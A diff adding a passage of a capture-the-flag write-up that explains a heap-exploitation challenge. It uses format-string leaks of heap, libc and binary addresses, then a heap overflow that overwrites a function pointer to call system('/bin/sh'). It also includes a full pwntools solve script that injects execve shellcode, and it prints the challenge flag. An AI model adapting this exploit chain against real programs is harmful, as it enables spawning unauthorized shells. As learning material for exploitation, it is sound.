@@ -686,11 +686,64 @@ This means that whenever we leak the pointer at stack offset 11 we would get a l
 
 Ok now what? we now need to set `chunk->func` to `system` by filling up `chunk->name[32]` and the next 8 bytes will be `chunk->func`
 
+Now when the function pointer is about to be executed it would do `ptr2->func()(ptr2)` so at this point `ptr2->func` would be `system` but we need `ptr2` to be `/bin/sh` 
 
+To do that we just set the first 8 bytes to be `/bin/sh\x00` then is effectively does: `system("/bin/sh")`
 
+Doing that works!
+![image](https://github.com/user-attachments/assets/97db2295-35c4-4707-904c-60716cf13fb8)
 
+```
+Flag: r00t{M4yb3_50m3t1m35_th3y_d0_l13_3e50dde}
+```
 
+But now the way i initially tried solving this was by shellcode injection which worked locally but for some reason when the binary is executed using `socat` it just doesn't work
 
+Anyways this is how i did it:
+- I leaked the heap address and then calculated the offset from our current leak to that of the second allocated memory
+- Used the heap overflow to modify `ptr2->func` to the heap address of `ptr2`, but i didn't fill `ptr2->name[32]` with junk but rather my shellcode
+- When the function pointer is about to be executed it calls `ptr2->func` which now points to `ptr2` which basically contains our shellcode
+- Profit!
+
+This is the solve here:
+![image](https://github.com/user-attachments/assets/3ab01d37-365e-46f1-aa8a-b67243663484)
+
+```python
+def solve():
+
+    io.sendline(b"%7$p.%11$p.%15$p")
+    io.recvuntil(b"tune : ")
+    addr = io.recvline().split(b".")
+
+    heap_leak = int(addr[0], 16)
+    libc.address = int(addr[1], 16) - 0x2a1ca
+    exe.address = int(addr[2].strip(), 16) - 0x1332
+
+    buf = heap_leak + 0x1450
+    
+    info("libc base: %#x", libc.address)
+    info("elf base: %#x", exe.address)
+    info("heap buf: %#x", buf)
+
+    sc = asm("""
+            xor eax, eax
+            mov al, 0x3b
+            lea rdi, [rip+sh]
+            xor esi, esi
+            xor edx, edx
+            syscall
+            
+            sh:
+                .ascii "/bin/sh"
+                .byte 0
+        """)
+
+    payload = sc.ljust(0x20, asm("nop")) + p64(buf)
+
+    io.sendline(payload)
+
+    io.interactive()
+```
 
 
 
